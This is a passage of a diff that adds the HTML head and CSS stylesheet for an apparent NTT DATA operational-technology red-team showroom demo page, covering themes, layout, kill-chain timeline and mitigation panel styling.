@@ -1,0 +1,2120 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>NTT DATA · OT Red Team · Showroom Live Demo</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Noto+Sans:wght@400;500;700&family=Noto+Serif:wght@400;700&display=swap" rel="stylesheet">
+<style>
+/* ============ NTT DATA brand tokens (from official brand sheet) ============ */
+:root{
+  /* NTT DATA brand anchor (kept) + desaturated professional palette */
+  --future-blue:       #0072BC;
+  --future-blue-150:   #005B96;
+  --future-blue-50:    #1E95E5;   /* azul presente */
+  --smart-navy:        #141A24;   /* warm charcoal */
+  --turquoise:         #3FB4EA;   /* accent-hl azul chispa */
+  --green:             #4EBD7C;   /* verde vivo */
+  --yellow:            #F5B42C;   /* ámbar brillante */
+  --orange:            #F27E22;   /* naranja fuerte */
+  --orange-150:        #E8473A;   /* rojo alerta */
+  --grey-50:           #E8E8E8;
+  --text-grey:         #2E404D;
+  --white:             #FFFFFF;
+
+  --bg-0:   #0D1117;
+  --bg-1:   var(--smart-navy);
+  --bg-2:   #1C232F;
+  --bg-3:   #242B38;
+  --line:   #2A313D;
+  --line-2: #3A4252;
+
+  /* semantic theme tokens (default = dark) */
+  --body-grad-1:     #1C232F;
+  --body-grad-2:     #0D1117;
+  --grid-line:       rgba(111,179,224,0.035);
+  --header-grad-1:   rgba(20,26,36,0.98);
+  --header-grad-2:   rgba(28,35,47,0.92);
+  --surface-panel-1: rgba(36,43,56,0.55);
+  --surface-panel-2: rgba(20,26,36,0.9);
+  --surface-card-1: rgba(36,43,56,0.60);
+  --surface-card-2: rgba(20,26,36,0.90);
+  --surface-card-hover:  rgba(74,143,199,0.08);
+  --surface-card-active: rgba(0,114,188,0.18);
+  --surface-sidebar: rgba(20,26,36,0.6);
+  --surface-stage:   rgba(13,17,23,0.5);
+  --surface-input:   rgba(13,17,23,0.8);
+  --surface-counter: rgba(13,17,23,0.6);
+  --text-main:       #E6E8EB;
+  --text-strong:     #F5F7FA;
+  --text-muted:      #C4C9D0;
+  --text-subtle:     #9AA3B0;
+  --text-dim:        #7A8190;
+  --kbd-bg:          var(--bg-2);
+  --zone-ot-fill:    rgba(74,143,199,0.035);
+  --zone-plant-fill: rgba(74,122,92,0.05);
+  --zone-untrusted-stroke:#B05245;
+  --zone-ot-stroke:       #4A7FB5;
+  --zone-plant-stroke:    #55996C;
+  --topology-node-fill-1: #242B38;
+  --topology-node-fill-2: #1C232F;
+  --topology-station-fill-1:#23302A;
+  --topology-station-fill-2:#1A2420;
+  --topology-label:       #E6E8EB;
+  --topology-sub-label:   #9AA3B0;
+  --topology-legend:      #9AA3B0;
+  --topology-edge-idle:   #3A4252;
+  --shadow-color:    rgba(0,0,0,0.45);
+  --surface-mitigations:  rgba(74,122,92,0.07);
+  --mitigations-border:   rgba(74,122,92,0.30);
+  --mitigations-text:     #B5C9BD;
+
+  --font-sans:  'Noto Sans', Arial, sans-serif;
+  --font-serif: 'Noto Serif', Georgia, serif;
+  --font-mono:  ui-monospace, 'SFMono-Regular', Consolas, 'Liberation Mono', monospace;
+}
+
+/* ============ LIGHT theme overrides ============ */
+body[data-theme="light"]{
+  --future-blue-50:    #0283CC;   /* azul presente en light */
+  --turquoise:         #0F7FBA;   /* accent-hl light brillante */
+  --green:             #2F9A5B;
+  --yellow:            #CF981F;
+  --orange:            #D06022;
+  --orange-150:        #CA3930;
+
+  --bg-0: #F7F8FA;
+  --bg-1: #FFFFFF;
+  --bg-2: #EEF1F5;
+  --bg-3: #E4E8EE;
+  --line:   #D5DAE2;
+  --line-2: #B8BFC9;
+
+  --body-grad-1:     #F0F3F7;
+  --body-grad-2:     #F7F8FA;
+  --grid-line:       rgba(46,64,90,0.05);
+  --header-grad-1:   #FFFFFF;
+  --header-grad-2:   #F7F8FA;
+  --surface-panel-1: #FFFFFF;
+  --surface-panel-2: #FFFFFF;
+  --surface-card-1:  #FFFFFF;
+  --surface-card-2:  #FFFFFF;
+  --surface-card-hover:  #EDF1F6;
+  --surface-card-active: #DCE5F0;
+  --surface-sidebar: #FAFBFC;
+  --surface-stage:   #F4F6F9;
+  --surface-input:   #F1F3F7;
+  --surface-counter: #F3F5F8;
+  --text-main:       #2E3947;
+  --text-strong:     #1E2937;
+  --text-muted:      #4A5568;
+  --text-subtle:     #5B6472;
+  --text-dim:        #808A99;
+  --kbd-bg:          #EEF1F5;
+  --zone-ot-fill:    rgba(46,127,184,0.05);
+  --zone-plant-fill: rgba(63,107,80,0.06);
+  --zone-untrusted-stroke:#B84A3C;
+  --zone-ot-stroke:       #2E7FB8;
+  --zone-plant-stroke:    #3E8F5F;
+  --topology-node-fill-1: #F4F6F9;
+  --topology-node-fill-2: #E5EAF0;
+  --topology-station-fill-1:#F4F7F4;
+  --topology-station-fill-2:#E3ECE5;
+  --topology-label:       #1E2937;
+  --topology-sub-label:   #5B6472;
+  --topology-legend:      #5B6472;
+  --topology-edge-idle:   #B8BFC9;
+  --shadow-color:    rgba(30,41,55,0.10);
+  --surface-mitigations:  #EEF3EF;
+  --mitigations-border:   rgba(63,107,80,0.30);
+  --mitigations-text:     #355245;
+}
+
+*{ box-sizing:border-box; margin:0; padding:0; }
+html,body{ height:100%; overflow:hidden; }
+body{
+  background: var(--body-grad-2);
+  color: var(--text-main);
+  font-family: var(--font-sans);
+  font-size: 15px;
+  line-height: 1.45;
+  -webkit-font-smoothing: antialiased;
+  transition: background .25s ease, color .25s ease;
+}
+
+/* subtle grid backdrop */
+body::before{
+  content:""; position:fixed; inset:0; pointer-events:none; z-index:0;
+  background-image:
+    linear-gradient(var(--grid-line) 1px, transparent 1px),
+    linear-gradient(90deg, var(--grid-line) 1px, transparent 1px);
+  background-size: 48px 48px;
+  mask-image: radial-gradient(ellipse at center, #000 40%, transparent 90%);
+}
+
+/* ============ layout grid ============ */
+.app{
+  position:relative; z-index:1;
+  display:grid;
+  grid-template-columns: 270px 1fr 580px;
+  grid-template-rows: 64px 1fr;
+  grid-template-areas:
+    "header header header"
+    "sidebar stage  impact";
+  width:100vw; height:100vh;
+  gap:1px;
+  background: rgba(255,255,255,0.05);
+}
+
+/* ============ header ============ */
+header{
+  grid-area: header;
+  background: var(--header-grad-1);
+  border-bottom: 1px solid var(--line);
+  display:flex; align-items:center; padding: 0 24px;
+  gap:24px;
+}
+.brand{ display:flex; align-items:center; gap:14px; }
+.brand svg{ display:block; }
+.brand .logo{ height:28px; width:auto; }
+.brand .logo-dark  { display:block; }  /* shown on dark theme (default) */
+.brand .logo-light { display:none;  }
+body[data-theme="light"] .brand .logo-dark  { display:none;  }
+body[data-theme="light"] .brand .logo-light { display:block; }
+.brand .sep{ width:1px; height:28px; background: var(--line-2); }
+.brand .tag{
+  font-family: var(--font-mono); font-size:11px;
+  letter-spacing: 2.5px; text-transform: uppercase;
+  color: var(--future-blue-50);
+}
+.brand .tag strong{ color: var(--orange-150); font-weight:700; }
+
+.headline{ flex:1; text-align:center; }
+.headline h1{
+  font-family: var(--font-serif); font-weight:700; font-size:22px;
+  letter-spacing: 0.3px; color: var(--text-strong);
+}
+.headline .sub{
+  font-family: var(--font-mono); font-size: 11px;
+  letter-spacing: 2.5px; color: var(--future-blue-50); text-transform: uppercase;
+  margin-top:3px;
+}
+
+.status{ display:flex; align-items:center; gap:18px; font-family: var(--font-mono); font-size:11px; letter-spacing:1.5px; text-transform:uppercase; }
+.status .pill{
+  display:inline-flex; align-items:center; gap:8px;
+  padding: 6px 12px; border-radius: 100px;
+  background: rgba(163,52,42,0.10); border:1px solid rgba(163,52,42,0.35);
+  color: var(--orange-150);
+}
+.status .pill .dot{
+  width:8px; height:8px; border-radius:50%;
+  background: var(--orange-150);
+  animation: pulse 1.4s ease-in-out infinite;
+}
+.status .clock{ color: var(--text-subtle); }
+
+.theme-toggle, .lang-toggle{
+  background: transparent; border:1px solid var(--line-2);
+  color: var(--text-subtle); cursor:pointer;
+  width:34px; height:34px; border-radius:50%;
+  display:inline-flex; align-items:center; justify-content:center;
+  transition: all .2s ease;
+}
+.theme-toggle:hover, .lang-toggle:hover{
+  color: var(--future-blue-50); border-color: var(--future-blue-50);
+  background: rgba(74,143,199,0.08);
+}
+.theme-toggle svg{ width:16px; height:16px; }
+.lang-toggle .lang-code{
+  font-family: var(--font-mono); font-size:11px; font-weight:700;
+  letter-spacing:1px;
+}
+body[data-theme="light"] .theme-toggle .icon-sun{ display:none; }
+body[data-theme="light"] .theme-toggle .icon-moon{ display:inline; }
+.theme-toggle .icon-sun{ display:inline; }
+.theme-toggle .icon-moon{ display:none; }
+
+@keyframes pulse{
+  0%,100%{ opacity:1; transform:scale(1); }
+  50%{ opacity:.4; transform:scale(.75); }
+}
+
+/* ============ sidebar (scenarios) ============ */
+.sidebar{
+  grid-area: sidebar;
+  background: var(--surface-sidebar);
+  border-right:1px solid var(--line);
+  padding: 18px 14px; overflow-y:auto;
+  display:flex; flex-direction:column; gap:12px;
+}
+.sidebar h4{
+  font-family: var(--font-sans); font-weight:700; font-size:12px;
+  letter-spacing: 2.6px; text-transform:uppercase;
+  color: var(--future-blue-50); padding: 2px 8px 10px;
+}
+
+.scenario-card{
+  position:relative;
+  background: var(--surface-card-2);
+  border:1px solid var(--line);
+  border-radius: 10px; padding: 14px 14px 12px;
+  cursor:pointer; transition: all .25s ease;
+  overflow:hidden;
+}
+.scenario-card:hover{
+  border-color: var(--future-blue-50);
+  background: var(--surface-card-hover);
+  transform: translateY(-1px);
+}
+.scenario-card.active{
+  border-color: var(--future-blue-50);
+  background: var(--surface-card-active);
+  box-shadow: 0 0 0 1px rgba(0,114,188,0.28), 0 4px 12px rgba(0,0,0,0.22);
+}
+.scenario-card.active::before{
+  content:""; position:absolute; left:0; top:0; bottom:0; width:3px;
+  background: var(--future-blue);
+}
+.scenario-card .icon{
+  width:42px; height:42px; margin-bottom:10px;
+  display:flex; align-items:center; justify-content:center;
+  border-radius:8px; background: rgba(0,114,188,0.10);
+  border:1px solid rgba(74,143,199,0.28);
+}
+.scenario-card.active .icon{ background: rgba(0,114,188,0.18); border-color: var(--future-blue-50); }
+.scenario-card .code{
+  font-family: var(--font-mono); font-size:10px; letter-spacing:1.5px;
+  color: var(--future-blue-50); text-transform:uppercase; margin-bottom:4px;
+}
+.scenario-card .title{
+  font-family: var(--font-serif); font-weight:700; font-size:17px;
+  color: var(--text-strong); line-height:1.25; margin-bottom:5px;
+}
+.scenario-card .target{
+  font-family: var(--font-mono); font-size:11px; color: var(--text-subtle);
+  margin-bottom:10px; word-break:break-all; opacity:0.95;
+}
+.scenario-card .sev{
+  display:inline-block; font-family: var(--font-mono); font-size:10px;
+  letter-spacing:1.2px; text-transform:uppercase;
+  padding: 2px 8px; border-radius: 100px;
+}
+.sev.critical{ background: rgba(163,52,42,0.16); color:#D08076; border:1px solid rgba(163,52,42,0.42); }
+.sev.high    { background: rgba(184,92,42,0.14); color:#C28968; border:1px solid rgba(184,92,42,0.42); }
+.sev.medium  { background: rgba(184,138,42,0.14); color:#C2A054; border:1px solid rgba(184,138,42,0.42); }
+
+.sidebar .controls{
+  margin-top:auto;
+  border-top:1px solid var(--line);
+  padding-top:14px;
+  font-family: var(--font-mono); font-size:11px; color: var(--text-dim);
+}
+.sidebar .controls .row{ display:flex; justify-content:space-between; padding:3px 4px; }
+.sidebar .controls kbd{
+  font-family: var(--font-mono);
+  background: var(--kbd-bg); border:1px solid var(--line-2);
+  color: var(--text-main); padding: 1px 6px; border-radius:4px; font-size:10px;
+}
+
+/* ============ stage (center) ============ */
+.stage{
+  grid-area: stage;
+  background: var(--surface-stage);
+  padding: 20px 26px;
+  overflow:hidden;
+  display:grid;
+  grid-template-rows: auto auto 1fr;
+  grid-template-columns: minmax(0, 1fr); /* prevent auto-column from stretching to min-content of children */
+  gap: 18px;
+}
+.stage > *{ min-width: 0; }
+
+/* scenario header block */
+.scenario-hero{ display:flex; align-items:center; gap:18px; }
+.scenario-hero .phase-chip{
+  font-family: var(--font-mono); font-size:11px; font-weight:700; letter-spacing:2.5px;
+  text-transform:uppercase;
+  padding: 6px 12px; border-radius:100px;
+  background: rgba(0,114,188,0.10); color: var(--future-blue-50);
+  border:1px solid rgba(0,114,188,0.35);
+}
+.scenario-hero h1{
+  font-family: var(--font-serif); font-weight:700; font-size:36px;
+  color: var(--text-strong); letter-spacing: 0.2px; flex:1; line-height:1.12;
+  min-width: 0; /* allow shrink so meta's nowrap sibling never gets clipped */
+}
+.scenario-hero .meta{
+  font-family: var(--font-mono); font-size:11px; color: var(--text-subtle);
+  text-align:right; line-height:1.55;
+  flex-shrink: 0; white-space: nowrap;
+}
+.scenario-hero .meta strong{ color: var(--future-blue-50); font-weight:700; }
+
+/* kill chain timeline */
+.killchain{
+  position:relative; padding: 22px 4px 30px;
+  --kc-margin: 52px;
+  --kc-pct: 0;
+  --kc-halo: var(--bg-0);
+  isolation: isolate;
+}
+.killchain .track{
+  position:absolute; left: var(--kc-margin); right: var(--kc-margin);
+  top:51px; height:6px;
+  background: var(--line-2);
+  border-radius:3px;
+  z-index: 0;
+}
+.killchain .progress{
+  position:absolute; left: var(--kc-margin);
+  top:51px; height:6px; border-radius:3px;
+  width: calc((100% - var(--kc-margin) * 2) * var(--kc-pct));
+  background: var(--future-blue);
+  box-shadow: 0 0 8px rgba(0,114,188,0.22);
+  transition: width .45s ease;
+  z-index: 1;
+}
+.killchain .nodes{
+  display:flex; justify-content:space-between;
+  position:relative; z-index: 2;
+  /* keep the first/last node labels from being clipped by stage overflow */
+  padding-inline: 8px;
+}
+.kc-node{
+  width: 92px; cursor:pointer;
+  display:flex; flex-direction:column; align-items:center;
+  user-select:none;
+  background: transparent;
+}
+.kc-node .label{ max-width: 110px; }
+.kc-node .bead{
+  width: 52px; height:52px; border-radius:50%;
+  background: var(--bg-1); border:2px solid var(--text-dim);
+  display:flex; align-items:center; justify-content:center;
+  font-family: var(--font-mono); font-size:18px; font-weight:700;
+  color: var(--text-subtle); transition: all .25s ease;
+  position:relative; z-index:3;
+  /* solid halo = cuts the track/progress line at the bead edge */
+  box-shadow: 0 0 0 5px var(--kc-halo), 0 1px 3px var(--shadow-color);
+}
+.kc-node .label{
+  font-family: var(--font-mono); font-size:12px; letter-spacing:0.8px;
+  text-transform:uppercase; color: var(--text-subtle);
+  margin-top:12px; text-align:center; line-height:1.3;
+  opacity:.78;
+}
+.kc-node:hover .bead{ border-color: var(--future-blue-50); }
+.kc-node.visited .bead{
+  border-color: var(--future-blue-50); color: var(--future-blue-50);
+  /* opaque tinted fill so the line never shows through the visited bead */
+  background-color: var(--bg-1);
+  background-image: linear-gradient(rgba(74,143,199,0.10), rgba(74,143,199,0.10));
+}
+.kc-node.visited .label{ color: var(--future-blue-50); opacity:.95; }
+.kc-node.current .bead{
+  background: var(--future-blue); border-color: var(--future-blue-50); color: #fff;
+  transform: scale(1.25);
+  box-shadow:
+    0 0 0 5px var(--kc-halo),
+    0 0 0 6px rgba(111,179,224,0.18),
+    0 0 14px rgba(0,114,188,0.32);
+}
+.kc-node.current .label{
+  color: var(--future-blue-50); font-weight:700; font-size:13px; opacity:1;
+}
+.kc-node.impact.current .bead{
+  background: var(--orange-150); border-color: #E08577;
+  box-shadow:
+    0 0 0 5px var(--kc-halo),
+    0 0 0 6px rgba(163,52,42,0.16),
+    0 0 14px rgba(163,52,42,0.38);
+}
+.kc-node.impact.current .label{ color:#E08577; }
+
+/* step card */
+.stepcard{
+  background: linear-gradient(180deg, var(--surface-panel-1), var(--surface-panel-2));
+  border:1px solid var(--line-2);
+  border-radius: 14px; padding: 20px 22px 18px;
+  display:grid;
+  grid-template-columns: minmax(0,1fr) auto;
+  grid-template-areas: "head gauge";
+  gap: 14px 18px;
+  position:relative; overflow:hidden; min-height:0;
+  box-shadow: 0 4px 18px var(--shadow-color);
+}
+.stepcard::before{
+  content:""; position:absolute; top:0; left:0; right:0; height:2px;
+  background: var(--future-blue);
+}
+.stepcard .step-head{
+  grid-area: head; display:flex; align-items:center; gap:10px; flex-wrap:wrap;
+  padding-bottom:14px; border-bottom:1px solid var(--line);
+  row-gap:8px;
+}
+.stepcard > .gauge{
+  grid-area: gauge;
+  width: 170px; height: 110px;
+  align-self: center;
+  padding-bottom:14px; border-bottom:1px solid var(--line);
+}
+.stepcard .step-head .num{
+  font-family: var(--font-serif); font-weight:700; font-size: 44px;
+  color: var(--future-blue-50); line-height:0.9;
+  margin-right:4px;
+}
+.stepcard .step-head .phase{
+  font-family: var(--font-mono); font-size: 11px; letter-spacing:2.2px; font-weight:700;
+  text-transform:uppercase; color: var(--future-blue-50);
+  padding: 4px 10px; border:1px solid rgba(74,143,199,0.40);
+  background: rgba(74,143,199,0.08); border-radius:4px;
+}
+.stepcard .step-head .title{
+  font-family: var(--font-serif); font-weight:700; font-size:26px;
+  color: var(--text-strong); flex:1 1 100%; line-height:1.2;
+  letter-spacing: 0.1px;
+}
+.stepcard .step-head .hotkey{
+  font-family: var(--font-mono); font-size:13px; font-weight:700; color: var(--yellow);
+  padding: 4px 10px; border:1px solid rgba(184,138,42,0.45);
+  background: rgba(184,138,42,0.10); border-radius:4px;
+  letter-spacing:1px;
+}
+.stepcard .step-head .sev{
+  font-family: var(--font-mono); font-size:11px; letter-spacing:1.8px; font-weight:700;
+  text-transform:uppercase; padding: 4px 10px; border-radius:4px;
+  border:1px solid transparent;
+}
+.stepcard .step-head .sev.info{ color: var(--future-blue-50); border-color: rgba(74,143,199,0.42); background: rgba(74,143,199,0.12); }
+.stepcard .step-head .sev.low { color: var(--green);         border-color: rgba(74,122,92,0.42); background: rgba(74,122,92,0.12); }
+.stepcard .step-head .sev.med { color: var(--yellow);        border-color: rgba(184,138,42,0.42); background: rgba(184,138,42,0.12); }
+.stepcard .step-head .sev.high{ color: var(--orange);        border-color: rgba(184,92,42,0.45); background: rgba(184,92,42,0.14); }
+.stepcard .step-head .sev.crit{ color: var(--orange-150);    border-color: rgba(163,52,42,0.48); background: rgba(163,52,42,0.16); }
+
+.narrative{
+  font-family: var(--font-serif); font-weight:400; font-size: 17.5px;
+  line-height: 1.62; color: var(--text-muted);
+  padding-right:6px;
+  overflow:auto;
+}
+.narrative em{ color: var(--future-blue-50); font-style: normal; font-weight:700; }
+.narrative code{
+  font-family: var(--font-mono); font-size:0.88em;
+  color: var(--yellow);
+  background: rgba(184,138,42,0.10);
+  padding: 1px 5px; border-radius:3px;
+}
+
+/* ── Right-aside content blocks (action / effect / chain) ── */
+.action-desc{
+  font-family: var(--font-sans); font-size: 14px; line-height:1.55;
+  color: var(--text-main);
+  padding: 10px 12px;
+  background: rgba(63,180,234,0.06);
+  border:1px solid rgba(63,180,234,0.22);
+  border-left:3px solid var(--turquoise);
+  border-radius: 0 4px 4px 0;
+}
+.action-desc code{
+  font-family: var(--font-mono); font-size: 12px;
+  color: var(--turquoise); background: rgba(63,180,234,0.10);
+  padding: 1px 5px; border-radius:3px;
+}
+.effect-list{ list-style:none; margin:0; padding:0; }
+.effect-list li{
+  padding: 6px 0; color: var(--text-main); font-size: 13.5px; line-height:1.55;
+  display:grid; grid-template-columns: 92px 1fr; gap: 10px; align-items:start;
+}
+.effect-list li + li{ border-top:1px dashed var(--line); }
+.effect-list li .tag{
+  font-family: var(--font-mono); font-size: 10px; letter-spacing: 1.6px; font-weight:700;
+  text-transform:uppercase; color: var(--orange);
+  padding-top: 2px;
+}
+.panel-block.effect{
+  border-left:3px solid var(--orange);
+}
+.panel-block.chain{
+  border-left:3px solid var(--yellow);
+}
+.chain-list{ list-style:none; margin:0; padding:0;
+  font-family: var(--font-mono); font-size: 12.5px; color: var(--text-main);
+}
+.chain-list li{ display:grid; grid-template-columns: 22px 1fr; gap:6px; padding: 3px 0; }
+.chain-list li .n{ color: var(--yellow); font-weight:700; }
+.panel-block.chain[hidden]{ display:none; }
+
+/* topology (bottom row) */
+.bottom{
+  display:grid; grid-template-columns: 1fr; gap:14px;
+  min-height:0;
+}
+.panel{
+  background: var(--surface-panel-2);
+  border:1px solid var(--line-2);
+  border-radius:14px; padding: 14px 16px;
+  display:flex; flex-direction:column; min-height:0;
+  box-shadow: 0 4px 14px var(--shadow-color);
+}
+.panel h4{
+  font-family: var(--font-sans); font-weight:700; font-size:12px;
+  letter-spacing:2.6px; text-transform:uppercase;
+  color: var(--future-blue-50); margin-bottom:10px;
+  display:flex; align-items:center; gap:10px;
+}
+.panel h4::before{
+  content:""; width:8px; height:8px; background: var(--future-blue);
+  border-radius:50%;
+  box-shadow: 0 0 6px rgba(0,114,188,0.35);
+}
+
+/* topology SVG */
+.topology{ flex:1; min-height:0; position:relative; }
+.topology svg{ width:100%; height:100%; display:block; }
+
+/* ============ impact panel ============ */
+aside.impact{
+  grid-area: impact;
+  background: var(--surface-sidebar);
+  border-left:1px solid var(--line);
+  padding: 18px 18px; overflow-y:auto;
+  display:flex; flex-direction:column; gap:14px;
+}
+aside.impact > *{ flex-shrink: 0; }
+aside.impact > div.panel-block{
+  background: var(--surface-panel-2);
+  border:1px solid var(--line-2);
+  border-radius:12px;
+  padding: 12px 14px;
+  box-shadow: 0 2px 10px var(--shadow-color);
+}
+aside.impact h4{
+  font-family: var(--font-sans); font-weight:700; font-size:12px;
+  letter-spacing:2.6px; text-transform:uppercase;
+  color: var(--future-blue-50);
+  display:flex; align-items:center; gap:10px;
+  margin-bottom:8px;
+}
+aside.impact h4::before{
+  content:""; width:8px; height:8px; background: var(--future-blue);
+  border-radius:50%;
+  box-shadow: 0 0 6px rgba(0,114,188,0.32);
+}
+
+/* threat gauge — lives inside the stepcard, top-right */
+.gauge{
+  position:relative;
+  display:flex; align-items:center; justify-content:center;
+}
+.gauge svg{ width:100%; height:100%; }
+.gauge .label{
+  position:absolute; inset:0; display:flex; flex-direction:column;
+  align-items:center; justify-content:center; pointer-events:none;
+}
+.gauge .val{
+  font-family: var(--font-serif); font-weight:700; font-size:34px;
+  color:var(--text-strong); line-height:1;
+}
+.gauge .unit{
+  font-family: var(--font-mono); font-size:11px; letter-spacing:2.4px; font-weight:700;
+  color: var(--future-blue-50); text-transform:uppercase; margin-top:6px;
+}
+
+/* mitigations */
+.mitigations{
+  background: var(--surface-mitigations);
+  border:1px solid var(--mitigations-border);
+  border-radius:12px; padding:14px 16px;
+  box-shadow: 0 2px 10px var(--shadow-color);
+}
+.mitigations h4{ color: var(--green); margin-bottom:10px; }
+.mitigations h4::before{ background: var(--green); box-shadow: 0 0 6px rgba(74,122,92,0.32); }
+.mitigations ul{ list-style:none; font-size:13px; line-height:1.55; color: var(--mitigations-text); }
+.mitigations li{ padding:4px 0 4px 20px; position:relative; }
+.mitigations li::before{
+  content:"✓"; position:absolute; left:0; top:3px; color: var(--green); font-weight:700;
+  font-size:14px;
+}
+
+/* scrollbars */
+::-webkit-scrollbar{ width:6px; height:6px; }
+::-webkit-scrollbar-track{ background: transparent; }
+::-webkit-scrollbar-thumb{ background: var(--line-2); border-radius:3px; }
+::-webkit-scrollbar-thumb:hover{ background: var(--future-blue-150); }
+
+/* transitions */
+.fade-enter{ animation: fadein .35s ease; }
+@keyframes fadein{ from{ opacity:0; transform: translateY(6px); } to{ opacity:1; transform:none; } }
+
+/* ============ responsive — compact (scale-downs) ============ */
+@media (max-width: 1600px){
+  .app{ grid-template-columns: 250px 1fr 500px; }
+  .scenario-hero h1{ font-size: 30px; }
+  .headline h1{ font-size: 19px; letter-spacing: 0.1px; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }
+  .stepcard .step-head .title{ font-size: 23px; }
+  .stepcard .step-head .num{ font-size: 38px; }
+  .stepcard > .gauge{ width:150px; height:96px; }
+  .gauge .val{ font-size: 30px; }
+  .kc-node{ width: 88px; }
+}
+@media (max-width: 1400px){
+  .app{ grid-template-columns: 230px 1fr 430px; }
+  .scenario-hero h1{ font-size: 24px; }
+  .headline h1{ font-size: 17px; }
+  /* aside too narrow for head + gauge side-by-side → stack */
+  .stepcard{
+    grid-template-columns: 1fr;
+    grid-template-areas: "head" "gauge";
+    padding: 14px 16px 14px;
+  }
+  .stepcard > .gauge{
+    width:100%; height:92px;
+    border-bottom:none; padding-bottom:0;
+    margin-top:-4px;
+  }
+  .stepcard .step-head .title{ font-size: 19px; }
+  .stepcard .step-head .num{ font-size: 32px; }
+  .narrative{ font-size:15.5px; }
+  .kc-node{ width: 78px; }
+  .kc-node .bead{ width:46px; height:46px; font-size:16px; }
+  .kc-node .label{ font-size:11px; }
+  .gauge .val{ font-size:28px; }
+}
+@media (max-width: 1280px){
+  .app{ grid-template-columns: 210px 1fr 380px; }
+  .stage{ padding:14px 18px; gap:12px; }
+  .scenario-hero{ gap:12px; }
+  .scenario-hero h1{ font-size: 22px; }
+  .scenario-hero .meta{ display:none; }
+  .stepcard{ padding:14px 16px 14px; }
+  .stepcard .step-head .num{ font-size:30px; }
+  .stepcard .step-head .title{ font-size:18px; }
+  .narrative{ font-size:14.5px; line-height:1.55; }
+  .stepcard > .gauge{ width:100%; height:84px; }
+  .gauge .val{ font-size:26px; }
+  .kc-node{ width: 68px; }
+  .kc-node .bead{ width:42px; height:42px; font-size:14px; }
+  .kc-node .label{ font-size:10px; letter-spacing:0.5px; }
+  .killchain{ --kc-margin: 34px; }
+  .killchain .track, .killchain .progress{ top:41px; }
+}
+
+/* Laptops / small displays — allow vertical scroll and stack impact under stage */
+@media (max-width: 1100px){
+  html,body{ overflow:auto; height:auto; }
+  .app{
+    grid-template-columns: 200px 1fr;
+    grid-template-rows: auto auto auto;
+    grid-template-areas:
+      "header header"
+      "sidebar stage"
+      "sidebar impact";
+    height:auto; min-height:100vh;
+  }
+  aside.impact{
+    border-left:none; border-top:1px solid var(--line);
+    padding:16px 18px;
+  }
+  .sidebar{ overflow-y:visible; }
+  .stage{ overflow:visible; }
+  .scenario-hero h1{ font-size:22px; }
+  .scenario-hero .meta{ display:block; font-size:10px; }
+  .kc-node{ width: auto; flex:1; min-width:56px; }
+  .killchain{ --kc-margin: 36px; }
+}
+
+/* Tablet / narrow — single column stack */
+@media (max-width: 880px){
+  .app{
+    grid-template-columns: 1fr;
+    grid-template-rows: auto auto auto auto;
+    grid-template-areas:
+      "header"
+      "stage"
+      "impact"
+      "sidebar";
+  }
+  header{ padding: 0 14px; gap:12px; flex-wrap:wrap; height:auto; min-height:64px; }
+  .headline{ order:3; flex:1 1 100%; text-align:left; padding:6px 0; }
+  .headline h1{ font-size:16px; }
+  .headline .sub{ font-size:10px; letter-spacing:2px; }
+  .status{ gap:10px; font-size:10px; }
+  .brand .tag{ display:none; }
+  .sidebar{
+    grid-area: sidebar;
+    border-right:none; border-top:1px solid var(--line);
+    padding: 14px;
+  }
+  .sidebar #scenarioList{ display:grid; grid-template-columns: 1fr 1fr; gap:10px; }
+  .sidebar .controls{ display:none; }
+  aside.impact{
+    border-left:none; border-top:1px solid var(--line);
+    padding:16px;
+  }
+  .stage{ padding:14px 16px; gap:12px; }
+  .scenario-hero h1{ font-size:20px; }
+  .scenario-hero .phase-chip{ font-size:10px; padding:4px 9px; letter-spacing:1.5px; }
+  .stepcard .step-head .title{ font-size:18px; }
+  .stepcard .step-head .num{ font-size:30px; }
+  .narrative{ font-size:15px; }
+  .kc-node{ width:56px; }
+  .kc-node .bead{ width:38px; height:38px; font-size:13px; }
+  .kc-node .label{ font-size:9px; }
+  .killchain{ --kc-margin: 28px; }
+  .stepcard{
+    grid-template-columns: 1fr;
+    grid-template-areas: "head" "gauge";
+  }
+  .stepcard > .gauge{ width:100%; height:100px; border-bottom:none; padding-bottom:0; }
+  .gauge .val{ font-size:32px; }
+  .action-desc{ font-size:13px; padding:8px 10px; }
+  .effect-list li{ grid-template-columns: 78px 1fr; gap:8px; font-size:12.5px; }
+}
+
+/* Mobile / very narrow */
+@media (max-width: 560px){
+  body{ font-size:14px; }
+  .app{ gap:0; }
+  header{ padding:8px 10px; gap:8px; }
+  .brand .logo{ height:22px; }
+  .brand .sep{ display:none; }
+  .status .clock{ display:none; }
+  .headline h1{ font-size:14px; }
+  .headline .sub{ font-size:9px; letter-spacing:1.5px; }
+  .sidebar #scenarioList{ grid-template-columns: 1fr; }
+  .scenario-hero{ flex-wrap:wrap; }
+  .scenario-hero h1{ font-size:18px; }
+  .stepcard .step-head .title{ font-size:16px; }
+  .stepcard .step-head .num{ font-size:26px; }
+  .narrative{ font-size:14px; line-height:1.5; }
+  .kc-node{ width:48px; }
+  .kc-node .bead{ width:34px; height:34px; font-size:12px; }
+  .kc-node .label{ font-size:8px; letter-spacing:0.3px; }
+  .stepcard > .gauge{ height:86px; }
+  .gauge .val{ font-size:28px; }
+  .mitigations ul{ font-size:12px; }
+  .effect-list li{ grid-template-columns: 1fr; gap:2px; }
+  .effect-list li .tag{ padding-top:0; }
+}
+
+/* Short-height screens (typical laptops 1366×768 / 1440×900) */
+@media (max-height: 820px){
+  header{ height:52px; }
+  .app{ grid-template-rows: 52px 1fr; }
+  aside.impact{ padding:12px 14px; gap:10px; }
+  aside.impact > div.panel-block{ padding:10px 12px; }
+  .stage{ padding:12px 18px; gap:10px; }
+  .killchain{ padding:14px 4px 20px; }
+  .kc-node .bead{ width:44px; height:44px; font-size:15px; }
+  .kc-node .label{ font-size:10px; margin-top:10px; }
+  .stepcard{ padding:12px 16px; gap:10px; }
+  .stepcard .step-head{ padding-bottom:10px; }
+  .stepcard > .gauge{ height:88px; }
+  .gauge .val{ font-size:26px; }
+  .scenario-hero h1{ font-size:24px; }
+  .scenario-hero .phase-chip{ padding:5px 10px; font-size:10px; }
